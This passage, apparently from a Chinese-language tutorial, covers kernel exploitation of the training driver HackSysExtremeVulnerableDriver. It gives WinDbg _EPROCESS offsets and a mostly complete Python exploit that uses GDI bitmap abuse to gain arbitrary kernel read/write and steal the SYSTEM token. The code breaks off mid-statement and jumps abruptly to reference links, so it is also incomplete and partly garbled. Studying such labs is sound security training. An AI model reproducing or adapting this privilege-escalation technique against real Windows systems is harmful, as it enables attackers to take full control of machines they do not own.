       +0x2e8 UniqueProcessId    : Ptr64 Void
       +0x2f0 ActiveProcessLinks : _LIST_ENTRY
    kd> dt _EPROCESS ImageFileName Token
    ntdll!_EPROCESS
       +0x358 Token         : _EX_FAST_REF
       +0x450 ImageFileName : [15] UChar
我这里得到的是
    token_off = 0x358
    unique_process_id_off = 0x2e8
    active_process_links_off = 0x2f0
WIN~  
完整的EXP
    import sys,time,struct,ctypes,os
    from ctypes import *
    from ctypes.wintypes import *
    from subprocess import *
    from win32com.shell import shell
    import win32con
    kernel32 = windll.kernel32
    gdi32 = windll.gdi32
    ntdll = windll.ntdll
    hManager = HBITMAP()
    hWorker = HBITMAP()
    class PEB(Structure):
        _fields_ = [("Junk", c_byte * 0xF8),
                    ("GdiSharedHandleTable", c_void_p)]
    class PROCESS_BASIC_INFORMATION(Structure):
        _fields_ = [("Reserved1", LPVOID),
                    ("PebBaseAddress", POINTER(PEB)),
                    ("Reserved2", LPVOID * 2),
                    ("UniqueProcessId", c_void_p),
                    ("Reserved3", LPVOID)]
    class GDICELL64(Structure):
        _fields_ = [("pKernelAddress", c_void_p),
                    ("wProcessId", c_ushort), 
                    ("wCount", c_ushort),
                    ("wUpper", c_ushort),
                    ("wType", c_ushort),
                    ("pUserAddress", c_void_p)]
    class SYSTEM_MODULE_INFORMATION(Structure):
        _fields_ = [("Reserved", c_void_p * 2),
                    ("ImageBase", c_void_p), 
                    ("ImageSize", c_long),
                    ("Flags", c_ulong),
                    ("LoadOrderIndex", c_ushort),
                    ("InitOrderIndex", c_ushort),
                    ("LoadCount", c_ushort),
                    ("ModuleNameOffset", c_ushort),
                    ("FullPathName", c_char * 256)]
    def write_mem(dest, src, length):
        global hManager
        global hWorker
        write_buf = c_ulonglong(dest)
        gdi32.SetBitmapBits(HBITMAP(hManager), c_ulonglong(sizeof(write_buf)), LPVOID(addressof(write_buf)));
        gdi32.SetBitmapBits(HBITMAP(hWorker), c_ulonglong(length), src)
    def read_mem(src, dest, length):
        global hManager
        global hWorker
        write_buf = c_ulonglong(src)
        gdi32.SetBitmapBits(HBITMAP(hManager), c_ulonglong(sizeof(write_buf)), LPVOID(addressof(write_buf)));
        gdi32.GetBitmapBits(HBITMAP(hWorker), c_ulonglong(length), dest)
    def find_kernelBase(input_modules):
        modules = {}
        # Allocate arbitrary buffer and call NtQuerySystemInformation
        system_information = create_string_buffer(0)
        systeminformationlength = c_ulong(0)
        ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
        # Call NtQuerySystemInformation second time with right size
        system_information = create_string_buffer(systeminformationlength.value)
        ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
        # Read first 4 bytes which contains number of modules retrieved
        module_count = c_ulong(0)
        module_count_string = create_string_buffer(system_information.raw[:8])
        ctypes.memmove(addressof(module_count), module_count_string, sizeof(module_count))
        # Marshal each module information and store it in a dictionary
        system_information = create_string_buffer(system_information.raw[8:])
        for x in range(module_count.value):
            smi = SYSTEM_MODULE_INFORMATION()
            temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
            ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
            module_name =  smi.FullPathName.split('\')[-1]
            modules[module_name] = smi
        #debug_print ("rn[+] NtQuerySystemInformation():")
        # Get base addresses and return them in a list
        base_addresses = []
        for input_module in input_modules:
            try:
                base_address = modules[input_module].ImageBase
                #debug_print ("t[-] %s base address: 0x%X" % (input_module, base_address))
                base_addresses.append(base_address)
            except:
                base_addresses.append(0)
        return base_addresses
    def main():
        global hManager
        global hWorker
        hevDevice = kernel32.CreateFileA("\\.\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)
        if not hevDevice or hevDevice == -1:
            print "[-] Couldn't get Device Driver handle."
            sys.exit(0)
        gdi32.CreateBitmap.restype = HBITMAP
        hManager = gdi32.CreateBitmap(0x64, 0x64, 1, 32, c_void_p())
        hWorker = gdi32.CreateBitmap(0x64, 0x64, 1, 32, c_void_p())
        print "[+] hManager Handle      : {0}".format(hex(hManager))
        print "[+] hWorker Handle       : {0}".format(hex(hWorker))
        pbi = PROCESS_BASIC_INFORMATION()
        ntdll.NtQueryInformationProcess.argtypes = (HANDLE, UINT, c_void_p, ULONG, POINTER(ULONG))
        ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 0, byref(pbi), sizeof(pbi), None)
        peb = pbi.PebBaseAddress.contents
        gdiHandleTable = peb.GdiSharedHandleTable
        print "[+] GdiSharedHandleTable : {0}".format(hex(gdiHandleTable))
        ptr = gdiHandleTable + (hManager & 0xFFFF) * sizeof(GDICELL64())
        gdicell64 = cast(ptr, POINTER(GDICELL64))
        hManager_pvscan0_off = gdicell64.contents.pKernelAddress + 0x50
        print "[+] hManager_pvscan0_off : {0}".format(hex(hManager_pvscan0_off))
        ptr = gdiHandleTable + (hWorker & 0xFFFF) * sizeof(GDICELL64())
        gdicell64 = cast(ptr, POINTER(GDICELL64))
        hWorker_pvscan0_off = gdicell64.contents.pKernelAddress + 0x50
        print "[+] hWorker_pvscan0_off  : {0}".format(hex(hWorker_pvscan0_off))
        write_where = struct.pack(" GDI Bitmap Abuse (Win7-10
32/64bit)](http://www.fuzzysecurity.com/tutorials/expDev/21.html)  
[Window Kernel Exploit -> GDI Bitmap Abuse](http://gflow.co.kr/window-kernel-exploit-gdi-bitmap-abuse/)  
[Techwiki:Win32k/BASEOBJECT](https://www.reactos.org/wiki/Techwiki:Win32k/BASEOBJECT)